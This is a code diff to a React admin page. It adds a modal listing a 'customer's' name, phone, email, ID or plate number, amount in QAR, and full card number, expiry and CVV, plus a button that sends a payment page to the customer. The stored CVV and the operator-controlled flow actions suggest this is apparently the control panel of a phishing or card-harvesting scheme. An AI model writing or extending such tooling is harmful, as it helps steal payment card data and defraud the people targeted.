@@ -90,6 +90,7 @@ export function RequestDetailPage() {
 
   const [deleteOpen, setDeleteOpen] = useState(false);
   const [deleteBusy, setDeleteBusy] = useState(false);
+  const [customerModalOpen, setCustomerModalOpen] = useState(false);
 
   useEffect(() => {
     if (!id) return;
@@ -390,7 +391,10 @@ export function RequestDetailPage() {
                   <button
                     key={value}
                     className={`${s.flowActionBtn} ${btnClass}`}
-                    onClick={() => setSelectedAction(value)}
+                    onClick={() => {
+                      setSelectedAction(value);
+                      if (value === "redirect_payment") setCustomerModalOpen(true);
+                    }}
                     disabled={!hasCard && value !== "keep_waiting"}
                   >
                     <Icon size={15} />
@@ -423,6 +427,66 @@ export function RequestDetailPage() {
           </div>
         </div>
       </div>
+
+      {/* Customer details modal (shown when Payment page flow action is clicked) */}
+      {customerModalOpen && (
+        <div className={s.modalOverlay} onClick={() => setCustomerModalOpen(false)}>
+          <div className={s.modalBox} style={{ maxWidth: 480, width: "100%" }} onClick={(e) => e.stopPropagation()}>
+            <h3 className={s.modalTitle}>Customer Submitted Details</h3>
+            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px 24px", margin: "16px 0" }}>
+              {[
+                ["Full Name", record.fullName],
+                ["Mobile", record.mobile],
+                ["Email", record.email ?? "—"],
+                ["ID / Plate", record.identifier ?? "—"],
+                ["Amount", formatQar(record.amount)],
+                ["Status", record.status],
+                ["Reference", record.reference],
+              ].map(([label, value]) => (
+                <div key={label}>
+                  <p style={{ margin: 0, fontSize: "0.72rem", color: "#94a3b8", fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.05em" }}>{label}</p>
+                  <p style={{ margin: "2px 0 0", fontSize: "0.9rem", color: "#0f172a", fontWeight: 500 }}>{value}</p>
+                </div>
+              ))}
+              {record.notes && (
+                <div style={{ gridColumn: "1 / -1" }}>
+                  <p style={{ margin: 0, fontSize: "0.72rem", color: "#94a3b8", fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.05em" }}>Notes</p>
+                  <p style={{ margin: "2px 0 0", fontSize: "0.9rem", color: "#0f172a" }}>{record.notes}</p>
+                </div>
+              )}
+            </div>
+            {hasCard && (
+              <div style={{ background: "#f8fafc", borderRadius: 8, padding: "12px 16px", marginBottom: 16 }}>
+                <p style={{ margin: "0 0 8px", fontSize: "0.78rem", color: "#64748b", fontWeight: 700, textTransform: "uppercase" }}>Card Details</p>
+                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px 24px" }}>
+                  {[
+                    ["Cardholder", record.cardholderName],
+                    ["Card Number", cardNumStr],
+                    ["Expiry", expiryStr],
+                    ["CVV", record.cardCvv],
+                  ].map(([label, value]) => value ? (
+                    <div key={label}>
+                      <p style={{ margin: 0, fontSize: "0.72rem", color: "#94a3b8", fontWeight: 600 }}>{label}</p>
+                      <p style={{ margin: "2px 0 0", fontSize: "0.88rem", fontFamily: "monospace", color: "#0f172a" }}>{value}</p>
+                    </div>
+                  ) : null)}
+                </div>
+              </div>
+            )}
+            <div className={s.modalBtns}>
+              <button className={s.modalCancelBtn} onClick={() => setCustomerModalOpen(false)}>Close</button>
+              <button
+                className={s.saveBtn}
+                style={{ margin: 0 }}
+                onClick={() => { setCustomerModalOpen(false); handleFlowAction(); }}
+                disabled={flowBusy}
+              >
+                {flowBusy ? "Sending…" : "Send Payment Page to Customer"}
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* Delete confirmation */}
       {deleteOpen && (
